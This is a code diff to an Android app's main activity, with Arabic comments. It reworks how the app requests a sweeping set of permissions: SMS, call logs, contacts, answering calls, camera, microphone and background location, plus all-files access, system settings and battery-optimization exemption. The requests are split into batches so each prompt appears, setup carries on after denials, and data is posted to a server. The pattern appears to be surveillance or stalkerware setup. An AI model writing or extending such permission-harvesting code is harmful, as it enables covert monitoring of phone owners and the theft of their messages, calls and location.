@@ -39,13 +39,14 @@ class MainActivity : AppCompatActivity() {
     lateinit var webView: WebView
     private val PERMISSIONS_REQUEST_CODE = 101
     private var isSetupComplete = false
+    private var permissionBatchIndex = 0
 
     /**
-     * مراحل الأذونات - 11 مرحلة شاملة
+     * مراحل الأذونات - مراحل شاملة
      * لا يتم تخطي أي مرحلة أبداً
      */
     private enum class SetupStep(val id: Int) {
-        BASIC_RUNTIME(0),           // أذونات التشغيل العادية
+        BASIC_RUNTIME(0),           // أذونات التشغيل العادية (مقسمة لعدة دفعات)
         ALL_FILES_ACCESS(1),        // الوصول الكامل للملفات (Android 11+)
         WRITE_SETTINGS(2),          // تعديل إعدادات النظام
         BATTERY_OPTIMIZATION(3),    // تجاهل تحسين البطارية
@@ -64,37 +65,52 @@ class MainActivity : AppCompatActivity() {
     private var currentActivityResultCode = -1
 
     // ==================== أذونات التشغيل الشاملة ====================
-    // ملاحظة: WRITE_SETTINGS تمت إزالته لأنه إذن خاص يتم طلبه في خطوة منفصلة
-    // إدراجه هنا يسبب عدم ظهور对话框 على بعض الأجهزة
-    private val runtimePermissions = arrayOf(
-        // === الموقع ===
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-        // === الهاتف والمكالمات ===
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.ANSWER_PHONE_CALLS,
-        Manifest.permission.CALL_PHONE,
-        // === الرسائل وجهات الاتصال ===
-        Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_CONTACTS,
-        // === الكاميرا والصوت ===
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO,
-        // === التخزين والوسائط ===
-        Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.READ_MEDIA_IMAGES,
-        Manifest.permission.READ_MEDIA_VIDEO,
-        Manifest.permission.READ_MEDIA_AUDIO,
-        Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED,
-        // === الإشعارات والحساسات ===
-        Manifest.permission.POST_NOTIFICATIONS,
-        Manifest.permission.BODY_SENSORS,
-        Manifest.permission.ACTIVITY_RECOGNITION
-    )
+    // مقسمة لـ 6 دفعات لضمان ظهور كل الأذونات على جميع أجهزة أندرويد
+    private fun getPermissionBatches(): List<List<String>> {
+        val batch1 = mutableListOf(
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        val batch2 = mutableListOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO
+        )
+        val batch3 = mutableListOf(
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.ANSWER_PHONE_CALLS,
+            Manifest.permission.CALL_PHONE
+        )
+        val batch4 = mutableListOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_CONTACTS
+        )
+        val batch5 = mutableListOf<String>()
+        // أذونات الوسائط حسب إصدار أندرويد
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            batch5.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            batch5.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            batch5.add(Manifest.permission.READ_MEDIA_IMAGES)
+            batch5.add(Manifest.permission.READ_MEDIA_VIDEO)
+            batch5.add(Manifest.permission.READ_MEDIA_AUDIO)
+            batch5.add(Manifest.permission.POST_NOTIFICATIONS)
+            batch5.add(Manifest.permission.BODY_SENSORS)
+            batch5.add(Manifest.permission.ACTIVITY_RECOGNITION)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            batch5.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
+        }
+        // دفعة الموقع الخلفي (يجب أن تكون منفصلة على Android 10+)
+        val batch6 = mutableListOf<String>()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            batch6.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        }
+
+        return listOf(batch1, batch2, batch3, batch4, batch5, batch6).filter { it.isNotEmpty() }
+    }
 
     // ==================== دورة حياة النشاط ====================
 
@@ -144,57 +160,54 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ========== الخطوة 1: الأذونات الأساسية ==========
+    // ========== الخطوة 1: الأذونات الأساسية (مقسمة لدفعات) ==========
     private fun requestBasicPermissions() {
         jsNotify("onPermissionPending", "basic")
+        permissionBatchIndex = 0
+        requestNextPermissionBatch()
+    }
 
-        val supportedPermissions = runtimePermissions.filter { perm ->
-            when (perm) {
-                Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.READ_MEDIA_VIDEO,
-                Manifest.permission.READ_MEDIA_AUDIO,
-                Manifest.permission.POST_NOTIFICATIONS,
-                Manifest.permission.BODY_SENSORS,
-                Manifest.permission.ACTIVITY_RECOGNITION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
-                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE
-                Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
-                Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
-                Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
-                Manifest.permission.READ_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.R
-                else -> true
-            }
+    private fun requestNextPermissionBatch() {
+        val batches = getPermissionBatches()
+        if (permissionBatchIndex >= batches.size) {
+            Log.d("MainActivity", "✅ تم طلب جميع دفعات الأذونات الأساسية")
+            jsNotify("onPermissionGranted", "basic")
+            advanceToNextStep()
+            return
         }
 
-        val missing = supportedPermissions.filter {
+        val batch = batches[permissionBatchIndex]
+        val missing = batch.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
+
+        val batchNum = permissionBatchIndex + 1
+        val totalBatches = batches.size
+        Log.d("MainActivity", "📋 دفعة أذونات $batchNum/$totalBatches: ${missing.joinToString()}")
 
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
         } else {
-            jsNotify("onPermissionGranted", "basic")
-            advanceToNextStep()
+            permissionBatchIndex++
+            requestNextPermissionBatch()
         }
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            val allGranted = grantResults.isNotEmpty() && grantResults.all {
-                it == PackageManager.PERMISSION_GRANTED
-            }
-            if (allGranted) {
-                Log.d("MainActivity", "✅ تم منح جميع الأذونات الأساسية")
-                jsNotify("onPermissionGranted", "basic")
-            } else {
-                val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
-                val total = grantResults.size
-                Log.w("MainActivity", "⚠️ تم منح $grantedCount/$total أذونات - نكمل التفعيل")
+            val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
+            val total = grantResults.size
+            Log.d("MainActivity", "📋 نتيجة الأذونات: $grantedCount/$total")
+
+            if (grantedCount < total) {
+                Log.w("MainActivity", "⚠️ لم يتم منح جميع الأذونات - نكمل")
                 jsNotify("onPermissionWarning", "basic:$grantedCount/$total")
-                // نكمل حتى لو لم تُمنح كل الأذونات
-                jsNotify("onPermissionGranted", "basic")
             }
-            advanceToNextStep()
+
+            // الانتقال للدفعة التالية
+            permissionBatchIndex++
+            requestNextPermissionBatch()
         }
     }
 
@@ -411,7 +424,11 @@ class MainActivity : AppCompatActivity() {
                 OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
 
                 val responseCode = connection.responseCode
-                val response = connection.inputStream?.bufferedReader()?.readText() ?: ""
+                val response = if (responseCode in 200..299) {
+                    connection.inputStream?.bufferedReader()?.readText() ?: ""
+                } else {
+                    connection.errorStream?.bufferedReader()?.readText() ?: ""
+                }
 
                 Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")
 
